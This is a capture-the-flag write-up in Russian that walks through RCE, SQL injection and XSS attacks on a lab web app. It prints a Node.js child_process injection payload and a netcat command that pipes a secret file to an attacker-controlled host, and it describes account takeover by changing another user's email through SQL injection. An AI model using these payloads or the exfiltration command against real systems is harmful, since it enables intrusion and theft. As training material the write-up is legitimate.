# RCE
## Описание уязвимости

https://www.wallarm.com/what/the-concept-of-rce-remote-code-execution-attack

https://cwe.mitre.org/data/definitions/94.html

## Exploit

Поле ввода скидки позволяет выполнять команды через внедрение следующего кода:
require('child_process').exec(COMMAND)

Поле ввода:
![img_4.png](img_4.png)

Пример перехваченого и измененного запроса:

![img.png](img.png)
Результаты выполненых команд можно передать на хост через nc. Включаем nc на хосте на прослушивание на порту 8080 и получаем вывод команды:

![img_1.png](img_1.png)

В качестве команды передаем cat SuperSecretData | nc #ip# #port#

Получаем флаг:

![img_2.png](img_2.png)

# SQLi
## Описание уязвимости

https://portswigger.net/web-security/sql-injection
https://cwe.mitre.org/data/definitions/89.html

## Exploit

Функционал изменения почты в личном кабинете пользователя не фильтрует пользовательский ввод почты и использует для этого sql запрос.
Поле ввода:
![img_3.png](img_3.png)

При попытке изменения sql запроса, получаем Validation error:

![img_5.png](img_5.png)

При добавлении условия where email='#email#' данной ошибки нет, но до данного условия необходимо догадаться, так скажем smart bruteforce.

![img_6.png](img_6.png)

Проверим восстановление пароля по новой почте. Отправляем запрос и видим письмо со ссылкой на почте.

![img_7.png](img_7.png)

Воспользуемся ссылкой, изменим пароль и зайдем в профиль с новыми данными. 

![img_8.png](img_8.png)

Получаем флаг в личном кабинете пользователя, данные которого мы изменили.

![img_9.png](img_9.png)

# XSS
## Описание уязвимости

https://portswigger.net/web-security/cross-site-scripting
https://cwe.mitre.org/data/definitions/79.html

## Exploit

В поле сброса пароля, от нас требуют ввести почту. При вводе видим, что вызывается alert, где в тексте выводится то, что мы ввели и какой-то фиксированный текст. 

![img_10.png](img_10.png)

Предположим, что alert выполняется через функцию eval. Поэтому попробуем ввести такой ввод, чтобы помимо обычного alerta, выполнился и наш alert.

![img_11.png](img_11.png)
![img_12.png](img_12.png)

У нас выполнился наш alert, и мы можем добавить еще один, чтобы вытащить флаг. Таким образом мы выполним нужный alert, который вытащит флаг.

![img_13.png](img_13.png)
